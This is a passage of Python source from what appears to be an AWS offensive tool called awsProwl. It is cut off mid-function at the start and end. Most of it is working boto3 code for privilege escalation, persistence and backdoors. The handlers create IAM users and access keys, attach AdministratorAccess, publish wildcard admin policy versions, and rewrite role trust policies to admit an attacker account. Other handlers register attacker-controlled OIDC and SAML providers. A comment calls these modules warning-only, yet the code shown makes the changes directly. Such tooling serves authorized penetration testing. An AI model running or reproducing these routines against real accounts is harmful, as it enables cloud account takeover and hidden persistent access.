        "resource_name": "Exfiltration Warning",
        "region": "global",
        "rule_id": "s3_exfil_download_objects_warning",
    })
    return findings


# --- LAMBDA EXFIL HANDLERS ---

async def run_lambda_exfil_env_vars(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Extract Lambda environment variables (read-only metadata)."""
    return await run_lambda_check_env_vars(auth_manager, **kwargs)


# --- DESTRUCTIVE MODULE HANDLERS (EXPLOIT, PERSIST, BACKDOOR) ---
# These show warnings and require explicit confirmation before executing

async def _show_destructive_warning(module_name: str, description: str) -> list[dict]:
    """Show warning for destructive modules."""
    return [{
        "title": f"DESTRUCTIVE MODULE: {module_name}",
        "description": f"{description}\n\nThis module performs DESTRUCTIVE actions that modify AWS resources. It requires explicit authorization and confirmation. In a real implementation, this would execute the actual AWS API calls to create/modify resources.\n\nCurrent implementation: WARNING ONLY - No actions taken.",
        "severity": "critical",
        "category": "destructive_operation",
        "resource_type": "destructive_warning",
        "resource_id": module_name,
        "resource_name": module_name,
        "region": "global",
        "rule_id": f"{module_name}_warning",
    }]


# IAM EXPLOIT - Actual implementations
async def run_iam_exploit_create_user(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create new IAM user with specified permissions."""
    findings = []
    client = auth_manager.get_client("iam")

    # Get parameters from kwargs or prompt
    username = kwargs.get("username") or kwargs.get("user_name")
    if not username:
        username = f"awsprowl-user-{int(datetime.now().timestamp())}"

    policy_arn = kwargs.get("policy_arn")
    inline_policy = kwargs.get("inline_policy")
    create_access_key = kwargs.get("create_access_key", True)
    create_login_profile = kwargs.get("create_login_profile", False)
    password = kwargs.get("password")

    try:
        # Create user
        response = client.create_user(UserName=username)
        user_arn = response["User"]["Arn"]
        findings.append({
            "title": f"IAM User Created: {username}",
            "description": f"User ARN: {user_arn}",
            "severity": "high",
            "category": "exploit",
            "resource_type": "iam_user",
            "resource_id": username,
            "resource_name": username,
            "region": "global",
            "rule_id": "iam_exploit_create_user",
            "details": {"action": "create_user", "user_arn": user_arn},
        })

        # Attach managed policy if specified
        if policy_arn:
            client.attach_user_policy(UserName=username, PolicyArn=policy_arn)
            findings.append({
                "title": f"Policy Attached: {policy_arn}",
                "description": f"Attached managed policy to user {username}",
                "severity": "high",
                "category": "exploit",
                "resource_type": "iam_user",
                "resource_id": username,
                "resource_name": username,
                "region": "global",
                "rule_id": "iam_exploit_attach_policy",
            })

        # Create inline policy if specified
        if inline_policy:
            policy_name = kwargs.get("inline_policy_name", "awsprowl-inline-policy")
            client.put_user_policy(
                UserName=username,
                PolicyName=policy_name,
                PolicyDocument=json.dumps(inline_policy) if isinstance(inline_policy, dict) else inline_policy
            )
            findings.append({
                "title": f"Inline Policy Created: {policy_name}",
                "description": f"Created inline policy for user {username}",
                "severity": "high",
                "category": "exploit",
                "resource_type": "iam_user",
                "resource_id": username,
                "resource_name": username,
                "region": "global",
                "rule_id": "iam_exploit_put_user_policy",
            })

        # Create access key if requested
        if create_access_key:
            key_response = client.create_access_key(UserName=username)
            access_key = key_response["AccessKey"]
            findings.append({
                "title": f"Access Key Created for {username}",
                "description": f"Access Key ID: {access_key['AccessKeyId']}\nSecret Access Key: {access_key['SecretAccessKey']}\n\n⚠️ SAVE THESE CREDENTIALS - Secret key cannot be retrieved again!",
                "severity": "critical",
                "category": "credential_access",
                "resource_type": "iam_access_key",
                "resource_id": access_key["AccessKeyId"],
                "resource_name": f"{username} access key",
                "region": "global",
                "rule_id": "iam_exploit_create_access_key",
                "details": {
                    "access_key_id": access_key["AccessKeyId"],
                    "secret_access_key": access_key["SecretAccessKey"],
                    "create_date": access_key["CreateDate"].isoformat(),
                },
            })

        # Create login profile if requested
        if create_login_profile:
            if not password:
                import secrets
                import string
                password = "".join(secrets.choice(string.ascii_letters + string.digits + "!@#$%") for _ in range(16))
            client.create_login_profile(UserName=username, Password=password, PasswordResetRequired=True)
            findings.append({
                "title": f"Console Login Profile Created for {username}",
                "description": f"Temporary password: {password}\nPassword reset required on first login.",
                "severity": "high",
                "category": "exploit",
                "resource_type": "iam_login_profile",
                "resource_id": username,
                "resource_name": f"{username} login profile",
                "region": "global",
                "rule_id": "iam_exploit_create_login_profile",
            })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("iam_exploit_create_user", e)

    return findings


async def run_iam_exploit_create_access_key(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create access keys for existing users."""
    findings = []
    client = auth_manager.get_client("iam")

    target_user = kwargs.get("username") or kwargs.get("user_name") or kwargs.get("target_user")
    if not target_user:
        # List available users and use first one
        try:
            paginator = client.get_paginator("list_users")
            for page in paginator.paginate():
                users = page.get("Users", [])
                if users:
                    target_user = users[0]["UserName"]
                    break
        except Exception:
            pass

    if not target_user:
        findings.append({
            "title": "No Target User Specified",
            "description": "Provide 'username' parameter or ensure users exist in the account",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_target",
            "resource_name": "No target user",
            "region": "global",
            "rule_id": "iam_exploit_create_access_key_no_target",
        })
        return findings

    try:
        # Check existing keys first
        existing_keys = client.list_access_keys(UserName=target_user)
        active_keys = [k for k in existing_keys.get("AccessKeyMetadata", []) if k["Status"] == "Active"]

        if len(active_keys) >= 2:
            findings.append({
                "title": f"Max Keys Reached for {target_user}",
                "description": f"User already has 2 active access keys (max allowed). Cannot create more.",
                "severity": "medium",
                "category": "exploit",
                "resource_type": "iam_user",
                "resource_id": target_user,
                "resource_name": target_user,
                "region": "global",
                "rule_id": "iam_exploit_create_access_key_max_reached",
            })
            return findings

        key_response = client.create_access_key(UserName=target_user)
        access_key = key_response["AccessKey"]

        findings.append({
            "title": f"Access Key Created for {target_user}",
            "description": f"Access Key ID: {access_key['AccessKeyId']}\nSecret Access Key: {access_key['SecretAccessKey']}\n\n⚠️ SAVE THESE CREDENTIALS - Secret key cannot be retrieved again!",
            "severity": "critical",
            "category": "credential_access",
            "resource_type": "iam_access_key",
            "resource_id": access_key["AccessKeyId"],
            "resource_name": f"{target_user} access key",
            "region": "global",
            "rule_id": "iam_exploit_create_access_key",
            "details": {
                "access_key_id": access_key["AccessKeyId"],
                "secret_access_key": access_key["SecretAccessKey"],
                "create_date": access_key["CreateDate"].isoformat(),
                "target_user": target_user,
            },
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("iam_exploit_create_access_key", e)

    return findings


async def run_iam_exploit_attach_policy(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Attach managed/inline policies to users/roles/groups."""
    findings = []
    client = auth_manager.get_client("iam")

    target_type = kwargs.get("target_type", "user")  # user, role, group
    target_name = kwargs.get("target_name") or kwargs.get("username") or kwargs.get("role_name") or kwargs.get("group_name")
    policy_arn = kwargs.get("policy_arn")
    inline_policy = kwargs.get("inline_policy")
    inline_policy_name = kwargs.get("inline_policy_name", "awsprowl-inline-policy")

    if not target_name:
        findings.append({
            "title": "No Target Specified",
            "description": "Provide 'target_name' parameter (user, role, or group name)",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_target",
            "resource_name": "No target",
            "region": "global",
            "rule_id": "iam_exploit_attach_policy_no_target",
        })
        return findings

    try:
        if policy_arn:
            # Attach managed policy
            if target_type == "user":
                client.attach_user_policy(UserName=target_name, PolicyArn=policy_arn)
            elif target_type == "role":
                client.attach_role_policy(RoleName=target_name, PolicyArn=policy_arn)
            elif target_type == "group":
                client.attach_group_policy(GroupName=target_name, PolicyArn=policy_arn)

            findings.append({
                "title": f"Managed Policy Attached: {policy_arn}",
                "description": f"Attached to {target_type}: {target_name}",
                "severity": "high",
                "category": "exploit",
                "resource_type": f"iam_{target_type}",
                "resource_id": target_name,
                "resource_name": target_name,
                "region": "global",
                "rule_id": f"iam_exploit_attach_{target_type}_policy",
            })

        if inline_policy:
            # Create inline policy
            if target_type == "user":
                client.put_user_policy(UserName=target_name, PolicyName=inline_policy_name, PolicyDocument=json.dumps(inline_policy) if isinstance(inline_policy, dict) else inline_policy)
            elif target_type == "role":
                client.put_role_policy(RoleName=target_name, PolicyName=inline_policy_name, PolicyDocument=json.dumps(inline_policy) if isinstance(inline_policy, dict) else inline_policy)
            elif target_type == "group":
                client.put_group_policy(GroupName=target_name, PolicyName=inline_policy_name, PolicyDocument=json.dumps(inline_policy) if isinstance(inline_policy, dict) else inline_policy)

            findings.append({
                "title": f"Inline Policy Created: {inline_policy_name}",
                "description": f"Created for {target_type}: {target_name}",
                "severity": "high",
                "category": "exploit",
                "resource_type": f"iam_{target_type}",
                "resource_id": target_name,
                "resource_name": target_name,
                "region": "global",
                "rule_id": f"iam_exploit_put_{target_type}_policy",
            })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error(f"iam_exploit_attach_policy ({target_type})", e)

    return findings


async def run_iam_exploit_create_role(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create new IAM role with custom trust policy."""
    findings = []
    client = auth_manager.get_client("iam")

    role_name = kwargs.get("role_name") or f"awsprowl-role-{int(datetime.now().timestamp())}"
    trust_policy = kwargs.get("trust_policy")
    policy_arn = kwargs.get("policy_arn")
    inline_policy = kwargs.get("inline_policy")
    inline_policy_name = kwargs.get("inline_policy_name", "awsprowl-inline-policy")
    description = kwargs.get("description", "Role created by awsProwl for authorized testing")
    max_session_duration = kwargs.get("max_session_duration", 3600)

    # Default trust policy allows assuming from current account
    if not trust_policy:
        identity = auth_manager.get_caller_identity()
        account_id = identity.get("Account", "")
        trust_policy = {
            "Version": "2012-10-17",
            "Statement": [{
                "Effect": "Allow",
                "Principal": {"AWS": f"arn:aws:iam::{account_id}:root"},
                "Action": "sts:AssumeRole"
            }]
        }

    try:
        response = client.create_role(
            RoleName=role_name,
            AssumeRolePolicyDocument=json.dumps(trust_policy) if isinstance(trust_policy, dict) else trust_policy,
            Description=description,
            MaxSessionDuration=max_session_duration,
        )
        role_arn = response["Role"]["Arn"]

        findings.append({
            "title": f"IAM Role Created: {role_name}",
            "description": f"Role ARN: {role_arn}\nTrust Policy: {json.dumps(trust_policy, indent=2)}",
            "severity": "high",
            "category": "exploit",
            "resource_type": "iam_role",
            "resource_id": role_name,
            "resource_name": role_name,
            "region": "global",
            "rule_id": "iam_exploit_create_role",
            "details": {"action": "create_role", "role_arn": role_arn, "trust_policy": trust_policy},
        })

        # Attach managed policy if specified
        if policy_arn:
            client.attach_role_policy(RoleName=role_name, PolicyArn=policy_arn)
            findings.append({
                "title": f"Policy Attached: {policy_arn}",
                "description": f"Attached managed policy to role {role_name}",
                "severity": "high",
                "category": "exploit",
                "resource_type": "iam_role",
                "resource_id": role_name,
                "resource_name": role_name,
                "region": "global",
                "rule_id": "iam_exploit_attach_role_policy",
            })

        # Create inline policy if specified
        if inline_policy:
            client.put_role_policy(
                RoleName=role_name,
                PolicyName=inline_policy_name,
                PolicyDocument=json.dumps(inline_policy) if isinstance(inline_policy, dict) else inline_policy
            )
            findings.append({
                "title": f"Inline Policy Created: {inline_policy_name}",
                "description": f"Created inline policy for role {role_name}",
                "severity": "high",
                "category": "exploit",
                "resource_type": "iam_role",
                "resource_id": role_name,
                "resource_name": role_name,
                "region": "global",
                "rule_id": "iam_exploit_put_role_policy",
            })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("iam_exploit_create_role", e)

    return findings


async def run_iam_exploit_update_assume_role_policy(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Modify role trust policy for cross-account assumption."""
    findings = []
    client = auth_manager.get_client("iam")

    role_name = kwargs.get("role_name")
    if not role_name:
        findings.append({
            "title": "No Role Specified",
            "description": "Provide 'role_name' parameter",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_role",
            "resource_name": "No role",
            "region": "global",
            "rule_id": "iam_exploit_update_assume_role_policy_no_role",
        })
        return findings

    trust_policy = kwargs.get("trust_policy")
    attacker_account = kwargs.get("attacker_account")  # External account to allow

    if not trust_policy and attacker_account:
        # Create trust policy allowing attacker account
        trust_policy = {
            "Version": "2012-10-17",
            "Statement": [{
                "Effect": "Allow",
                "Principal": {"AWS": f"arn:aws:iam::{attacker_account}:root"},
                "Action": "sts:AssumeRole"
            }]
        }
    elif not trust_policy:
        # Default to current account if no attacker account specified
        identity = auth_manager.get_caller_identity()
        account_id = identity.get("Account", "")
        trust_policy = {
            "Version": "2012-10-17",
            "Statement": [{
                "Effect": "Allow",
                "Principal": {"AWS": f"arn:aws:iam::{account_id}:root"},
                "Action": "sts:AssumeRole"
            }]
        }

    try:
        # Get current trust policy for comparison
        current_role = client.get_role(RoleName=role_name)
        current_policy = current_role["Role"]["AssumeRolePolicyDocument"]

        # Update trust policy
        client.update_assume_role_policy(
            RoleName=role_name,
            PolicyDocument=json.dumps(trust_policy) if isinstance(trust_policy, dict) else trust_policy
        )

        findings.append({
            "title": f"Role Trust Policy Updated: {role_name}",
            "description": f"Updated trust policy to allow cross-account assumption.\nNew Policy: {json.dumps(trust_policy, indent=2)}",
            "severity": "critical",
            "category": "privilege_escalation",
            "resource_type": "iam_role",
            "resource_id": role_name,
            "resource_name": role_name,
            "region": "global",
            "rule_id": "iam_exploit_update_assume_role_policy",
            "details": {
                "action": "update_assume_role_policy",
                "old_policy": current_policy,
                "new_policy": trust_policy,
            },
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("iam_exploit_update_assume_role_policy", e)

    return findings


async def run_iam_exploit_create_policy_version(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create new policy version with escalated permissions."""
    findings = []
    client = auth_manager.get_client("iam")

    policy_arn = kwargs.get("policy_arn")
    if not policy_arn:
        findings.append({
            "title": "No Policy ARN Specified",
            "description": "Provide 'policy_arn' parameter",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_policy",
            "resource_name": "No policy",
            "region": "global",
            "rule_id": "iam_exploit_create_policy_version_no_policy",
        })
        return findings

    policy_document = kwargs.get("policy_document")
    set_as_default = kwargs.get("set_as_default", True)

    # Default to admin policy if not specified
    if not policy_document:
        policy_document = {
            "Version": "2012-10-17",
            "Statement": [{
                "Effect": "Allow",
                "Action": "*",
                "Resource": "*"
            }]
        }

    try:
        # Get current default version
        policy = client.get_policy(PolicyArn=policy_arn)
        old_default_version = policy["Policy"]["DefaultVersionId"]

        # Create new version
        response = client.create_policy_version(
            PolicyArn=policy_arn,
            PolicyDocument=json.dumps(policy_document) if isinstance(policy_document, dict) else policy_document,
            SetAsDefault=set_as_default
        )
        new_version = response["PolicyVersion"]["VersionId"]

        findings.append({
            "title": f"Policy Version Created: {policy_arn}",
            "description": f"New version: {new_version}, Set as default: {set_as_default}\nPolicy Document: {json.dumps(policy_document, indent=2)}",
            "severity": "critical" if set_as_default else "high",
            "category": "privilege_escalation" if set_as_default else "exploit",
            "resource_type": "iam_policy",
            "resource_id": policy_arn,
            "resource_name": policy_arn.split("/")[-1],
            "region": "global",
            "rule_id": "iam_exploit_create_policy_version",
            "details": {
                "action": "create_policy_version",
                "policy_arn": policy_arn,
                "new_version": new_version,
                "old_default_version": old_default_version,
                "set_as_default": set_as_default,
            },
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("iam_exploit_create_policy_version", e)

    return findings


# IAM EXPLOIT - Additional modules
async def run_iam_exploit_bruteforce_permissions(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Brute-force IAM permissions by simulating policy actions using IAM policy simulation."""
    findings = []
    client = auth_manager.get_client("iam")

    # Get all users and roles to test
    entities = []

    try:
        # Get users
        paginator = client.get_paginator("list_users")
        for page in paginator.paginate():
            for user in page.get("Users", []):
                entities.append({"type": "user", "arn": user["Arn"], "name": user["UserName"]})

        # Get roles
        paginator = client.get_paginator("list_roles")
        for page in paginator.paginate():
            for role in page.get("Roles", []):
                if not role.get("Path", "").startswith("/aws-service-role/"):
                    entities.append({"type": "role", "arn": role["Arn"], "name": role["RoleName"]})

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("iam:ListUsers/ListRoles", e)

    # Common sensitive actions to test
    sensitive_actions = kwargs.get("actions", [
        "iam:CreateUser", "iam:DeleteUser", "iam:CreateAccessKey", "iam:CreateLoginProfile",
        "iam:AttachUserPolicy", "iam:PutUserPolicy", "iam:AttachRolePolicy", "iam:PutRolePolicy",
        "iam:CreatePolicy", "iam:CreatePolicyVersion", "iam:SetDefaultPolicyVersion",
        "iam:CreateRole", "iam:UpdateAssumeRolePolicy", "iam:PassRole",
        "iam:AddUserToGroup", "iam:CreateServiceLinkedRole",
        "sts:AssumeRole", "ec2:RunInstances", "lambda:CreateFunction", "lambda:UpdateFunctionCode",
        "s3:PutObject", "s3:GetObject", "s3:DeleteObject", "secretsmanager:GetSecretValue",
        "kms:Decrypt", "kms:Encrypt"
    ])

    # Test each entity
    for entity in entities[:20]:  # Limit to first 20 to avoid timeout
        try:
            response = client.simulate_principal_policy(
                PolicySourceArn=entity["arn"],
                ActionNames=sensitive_actions
            )

            allowed_actions = []
            for result in response.get("EvaluationResults", []):
                if result["EvalDecision"] == "allowed":
                    allowed_actions.append(result["EvalActionName"])

            if allowed_actions:
                findings.append({
                    "title": f"Permissions Found: {entity['name']} ({entity['type']})",
                    "description": f"Allowed sensitive actions: {', '.join(allowed_actions)}",
                    "severity": "high",
                    "category": "privilege_escalation",
                    "resource_type": f"iam_{entity['type']}",
                    "resource_id": entity["name"],
                    "resource_name": entity["name"],
                    "region": "global",
                    "rule_id": "iam_exploit_bruteforce_permissions",
                    "details": {
                        "entity_type": entity["type"],
                        "entity_arn": entity["arn"],
                        "allowed_actions": allowed_actions,
                    },
                })

        except botocore.exceptions.ClientError as e:
            if e.response.get("Error", {}).get("Code") != "AccessDenied":
                log.debug(f"SimulatePrincipalPolicy failed for {entity['name']}: {e}")

    return findings


async def run_iam_exploit_decode_access_key_id(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Decode AWS Access Key ID to extract account ID and key metadata."""
    findings = []

    access_key_id = kwargs.get("access_key_id")
    if not access_key_id:
        # Try to get from current credentials
        try:
            identity = auth_manager.get_caller_identity()
            # This would need the actual access key, which we don't have in the identity
            findings.append({
                "title": "Access Key ID Required",
                "description": "Provide 'access_key_id' parameter to decode. Current identity doesn't expose the access key ID.",
                "severity": "info",
                "category": "informational",
                "resource_type": "other",
                "resource_id": "no_key",
                "resource_name": "No access key",
                "region": "global",
                "rule_id": "iam_exploit_decode_access_key_id_no_key",
            })
        except Exception:
            pass
        return findings

    # Decode the access key ID (base32 decoding)
    # AWS Access Key IDs are base32 encoded with the account ID embedded
    try:
        import base64

        # Remove prefix if present (AKIA, ASIA, AROA, etc.)
        key_body = access_key_id[4:] if access_key_id.startswith(("AKIA", "ASIA", "AROA", "AIDA", "AGOA", "AIPA", "ANPA", "ANVA", "ASCA")) else access_key_id

        # Pad for base32 decoding
        padded = key_body + "=" * ((8 - len(key_body) % 8) % 8)
        decoded = base64.b32decode(padded)

        # The account ID is in bytes 1-7 (7 bytes = 56 bits, but AWS uses a specific encoding)
        # Account ID extraction is more complex - it's a 12-digit number encoded in the key
        # This is a simplified version - real decoding requires the specific AWS algorithm

        findings.append({
            "title": f"Access Key Analysis: {access_key_id}",
            "description": f"Key Prefix: {access_key_id[:4]}\nKey Body: {key_body}\nDecoded bytes: {decoded.hex()}\n\nNote: Full account ID extraction requires AWS-specific decoding algorithm. The key prefix indicates type:\n- AKIA: IAM User long-term key\n- ASIA: STS temporary credentials\n- AROA: IAM Role\n- AIDA: IAM User\n- AGOA: EC2 Instance Profile\n- AIPA: EC2 Instance Profile\n- ANPA: IAM User\n- ANVA: IAM User\n- ASCA: Certificate",
            "severity": "medium",
            "category": "reconnaissance",
            "resource_type": "iam_access_key",
            "resource_id": access_key_id,
            "resource_name": access_key_id,
            "region": "global",
            "rule_id": "iam_exploit_decode_access_key_id",
            "details": {
                "access_key_id": access_key_id,
                "prefix": access_key_id[:4],
                "decoded_hex": decoded.hex(),
            },
        })

    except Exception as e:
        findings.append({
            "title": f"Decode Failed: {access_key_id}",
            "description": f"Error decoding access key: {str(e)}",
            "severity": "info",
            "category": "informational",
            "resource_type": "iam_access_key",
            "resource_id": access_key_id,
            "resource_name": access_key_id,
            "region": "global",
            "rule_id": "iam_exploit_decode_access_key_id_error",
        })

    return findings


# IAM PERSIST - Actual implementations
async def run_iam_persist_create_user(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create IAM user with programmatic access for persistence."""
    return await run_iam_exploit_create_user(auth_manager, **kwargs, create_access_key=True, create_login_profile=False)


async def run_iam_persist_create_role(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create IAM role with trust policy for cross-account/service assumption."""
    findings = []
    client = auth_manager.get_client("iam")

    role_name = kwargs.get("role_name") or f"awsprowl-persist-{int(datetime.now().timestamp())}"
    attacker_account = kwargs.get("attacker_account")
    service_principal = kwargs.get("service_principal")

    # Default trust policy for cross-account assumption
    if not attacker_account and not service_principal:
        identity = auth_manager.get_caller_identity()
        account_id = identity.get("Account", "")
        attacker_account = account_id  # Default to current account

    if service_principal:
        trust_policy = {
            "Version": "2012-10-17",
            "Statement": [{
                "Effect": "Allow",
                "Principal": {"Service": service_principal},
                "Action": "sts:AssumeRole"
            }]
        }
    else:
        trust_policy = {
            "Version": "2012-10-17",
            "Statement": [{
                "Effect": "Allow",
                "Principal": {"AWS": f"arn:aws:iam::{attacker_account}:root"},
                "Action": "sts:AssumeRole",
                "Condition": {"Bool": {"aws:MultiFactorAuthPresent": "false"}}
            }]
        }

    # Add admin policy by default for persistence
    policy_arn = kwargs.get("policy_arn", "arn:aws:iam::aws:policy/AdministratorAccess")

    try:
        response = client.create_role(
            RoleName=role_name,
            AssumeRolePolicyDocument=json.dumps(trust_policy),
            Description=f"Persistence role created by awsProwl",
            MaxSessionDuration=43200,  # 12 hours max
        )
        role_arn = response["Role"]["Arn"]

        findings.append({
            "title": f"Persistence Role Created: {role_name}",
            "description": f"Role ARN: {role_arn}\nTrust Policy allows assumption from account: {attacker_account}",
            "severity": "critical",
            "category": "persistence",
            "resource_type": "iam_role",
            "resource_id": role_name,
            "resource_name": role_name,
            "region": "global",
            "rule_id": "iam_persist_create_role",
            "details": {"action": "create_role", "role_arn": role_arn, "attacker_account": attacker_account},
        })

        # Attach admin policy
        client.attach_role_policy(RoleName=role_name, PolicyArn=policy_arn)
        findings.append({
            "title": f"AdministratorAccess Attached to {role_name}",
            "description": f"Full admin permissions granted for persistence",
            "severity": "critical",
            "category": "persistence",
            "resource_type": "iam_role",
            "resource_id": role_name,
            "resource_name": role_name,
            "region": "global",
            "rule_id": "iam_persist_attach_admin_policy",
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("iam_persist_create_role", e)

    return findings


async def run_iam_persist_create_access_key(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create access keys for existing users/roles."""
    return await run_iam_exploit_create_access_key(auth_manager, **kwargs)


async def run_iam_persist_create_login_profile(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create console login profile for IAM user."""
    findings = []
    client = auth_manager.get_client("iam")

    target_user = kwargs.get("username") or kwargs.get("user_name") or kwargs.get("target_user")
    password = kwargs.get("password")
    reset_required = kwargs.get("reset_required", True)

    if not target_user:
        findings.append({
            "title": "No Target User Specified",
            "description": "Provide 'username' parameter",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_target",
            "resource_name": "No target user",
            "region": "global",
            "rule_id": "iam_persist_create_login_profile_no_target",
        })
        return findings

    try:
        if not password:
            import secrets
            import string
            password = "".join(secrets.choice(string.ascii_letters + string.digits + "!@#$%") for _ in range(16))

        client.create_login_profile(
            UserName=target_user,
            Password=password,
            PasswordResetRequired=reset_required
        )

        findings.append({
            "title": f"Console Login Profile Created for {target_user}",
            "description": f"Temporary password: {password}\nPassword reset required: {reset_required}",
            "severity": "high",
            "category": "persistence",
            "resource_type": "iam_login_profile",
            "resource_id": target_user,
            "resource_name": f"{target_user} login profile",
            "region": "global",
            "rule_id": "iam_persist_create_login_profile",
            "details": {"password": password, "reset_required": reset_required},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("iam_persist_create_login_profile", e)

    return findings


async def run_iam_persist_attach_admin_policy(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Attach AdministratorAccess or equivalent policy."""
    kwargs["policy_arn"] = kwargs.get("policy_arn", "arn:aws:iam::aws:policy/AdministratorAccess")
    return await run_iam_exploit_attach_policy(auth_manager, **kwargs)


async def run_iam_persist_update_assume_role_policy(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Modify role trust policy for persistent external assumption."""
    # Similar to exploit version but with persistence focus
    return await run_iam_exploit_update_assume_role_policy(auth_manager, **kwargs)


async def run_iam_persist_create_policy_version(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create new policy version with elevated permissions."""
    kwargs["set_as_default"] = kwargs.get("set_as_default", True)
    if "policy_document" not in kwargs:
        kwargs["policy_document"] = {
            "Version": "2012-10-17",
            "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
        }
    return await run_iam_exploit_create_policy_version(auth_manager, **kwargs)


async def run_iam_persist_add_user_to_group(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Add user to group with elevated permissions."""
    findings = []
    client = auth_manager.get_client("iam")

    username = kwargs.get("username") or kwargs.get("user_name")
    group_name = kwargs.get("group_name")

    if not username or not group_name:
        findings.append({
            "title": "Missing Parameters",
            "description": "Provide 'username' and 'group_name' parameters",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "missing_params",
            "resource_name": "Missing parameters",
            "region": "global",
            "rule_id": "iam_persist_add_user_to_group_missing",
        })
        return findings

    try:
        client.add_user_to_group(UserName=username, GroupName=group_name)

        findings.append({
            "title": f"User Added to Group: {username} -> {group_name}",
            "description": f"Added user {username} to group {group_name}",
            "severity": "medium",
            "category": "persistence",
            "resource_type": "iam_group",
            "resource_id": group_name,
            "resource_name": group_name,
            "region": "global",
            "rule_id": "iam_persist_add_user_to_group",
            "details": {"username": username, "group_name": group_name},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("iam_persist_add_user_to_group", e)

    return findings


async def run_iam_persist_create_service_linked_role(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create service-linked role for service-specific persistence."""
    findings = []
    client = auth_manager.get_client("iam")

    service_name = kwargs.get("service_name")
    if not service_name:
        findings.append({
            "title": "No Service Name Specified",
            "description": "Provide 'service_name' parameter (e.g., 'lex.amazonaws.com', 'es.amazonaws.com')",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_service",
            "resource_name": "No service",
            "region": "global",
            "rule_id": "iam_persist_create_service_linked_role_no_service",
        })
        return findings

    try:
        response = client.create_service_linked_role(
            AWSServiceName=service_name,
            Description=f"Service-linked role for {service_name} created by awsProwl"
        )
        role = response["Role"]

        findings.append({
            "title": f"Service-Linked Role Created: {role['RoleName']}",
            "description": f"Service: {service_name}\nRole ARN: {role['Arn']}",
            "severity": "high",
            "category": "persistence",
            "resource_type": "iam_service_linked_role",
            "resource_id": role["RoleName"],
            "resource_name": role["RoleName"],
            "region": "global",
            "rule_id": "iam_persist_create_service_linked_role",
            "details": {"service_name": service_name, "role_arn": role["Arn"]},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("iam_persist_create_service_linked_role", e)

    return findings


# IAM BACKDOOR - Actual implementations
async def run_iam_backdoor_service_role(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create service-linked/service role with permissive trust policy."""
    kwargs["service_principal"] = kwargs.get("service_principal", "ec2.amazonaws.com")
    kwargs["policy_arn"] = kwargs.get("policy_arn", "arn:aws:iam::aws:policy/AdministratorAccess")
    return await run_iam_persist_create_role(auth_manager, **kwargs)


async def run_iam_backdoor_oidc_provider(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create OIDC identity provider with attacker-controlled issuer."""
    findings = []
    client = auth_manager.get_client("iam")

    issuer_url = kwargs.get("issuer_url")
    if not issuer_url:
        findings.append({
            "title": "No Issuer URL Specified",
            "description": "Provide 'issuer_url' parameter (e.g., 'https://attacker.com')",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_issuer",
            "resource_name": "No issuer",
            "region": "global",
            "rule_id": "iam_backdoor_oidc_provider_no_issuer",
        })
        return findings

    client_id = kwargs.get("client_id", "awsprowl-client")
    thumbprint = kwargs.get("thumbprint")  # Optional - can be auto-fetched

    try:
        response = client.create_open_id_connect_provider(
            Url=issuer_url,
            ClientIDList=[client_id],
            ThumbprintList=[thumbprint] if thumbprint else [],
        )
        provider_arn = response["OpenIDConnectProviderArn"]

        findings.append({
            "title": f"OIDC Provider Created: {issuer_url}",
            "description": f"Provider ARN: {provider_arn}\nClient ID: {client_id}\nAllows federation with attacker-controlled identity provider",
            "severity": "critical",
            "category": "backdoor",
            "resource_type": "iam_oidc_provider",
            "resource_id": provider_arn,
            "resource_name": issuer_url,
            "region": "global",
            "rule_id": "iam_backdoor_oidc_provider",
            "details": {"issuer_url": issuer_url, "client_id": client_id, "provider_arn": provider_arn},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("iam_backdoor_oidc_provider", e)

    return findings


async def run_iam_backdoor_saml_provider(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create SAML identity provider with attacker-controlled metadata."""
    findings = []
    client = auth_manager.get_client("iam")

    saml_metadata = kwargs.get("saml_metadata")
    provider_name = kwargs.get("provider_name", f"awsprowl-saml-{int(datetime.now().timestamp())}")

    if not saml_metadata:
        findings.append({
            "title": "No SAML Metadata Specified",
